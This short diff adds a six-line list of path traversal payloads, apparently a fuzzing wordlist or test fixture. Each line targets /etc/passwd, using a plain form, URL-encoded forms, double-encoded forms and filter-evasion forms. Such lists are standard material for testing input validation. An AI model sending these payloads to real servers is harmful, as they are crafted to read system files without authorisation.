@@ -1,0 +1,6 @@
+../../../etc/passwd
+..%2f..%2f..%2fetc/passwd
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc/passwd
+/etc/passwd
+..\/..\/..\/etc/passwd
